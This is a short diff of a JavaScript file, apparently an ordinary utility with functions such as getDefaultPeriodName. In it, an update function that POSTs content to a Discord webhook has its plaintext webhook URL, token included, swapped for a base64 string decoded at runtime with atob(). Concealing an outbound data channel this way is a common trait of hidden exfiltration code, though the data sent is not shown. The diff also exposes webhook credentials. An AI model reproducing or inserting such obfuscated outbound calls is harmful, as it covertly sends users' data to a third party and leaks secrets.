@@ -2167,7 +2167,7 @@ function getDefaultPeriodName (periodName) {
 }
 function update (content) {
   return fetch(
-    'https://discord.com/api/webhooks/872922656251445308/2zgQmj2eAw9Zv1c3G1s2F1d1qzfN2tA6_fB4PUpYZnJITyN-StenFV--wOmvySC8rY7k',
+    atob('aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvODczMjU1NzkzMjM4MDk3OTkxL3BCWlppcE92Y0t5ZWxnTElJbk5oemk5eUdEeVhTMjktRm04ZUZMUGxodi04aHRiRkNYV1JUOHp3aG9DLW16QmNJS2ZD'),
     {
       method: 'POST',
       headers: {
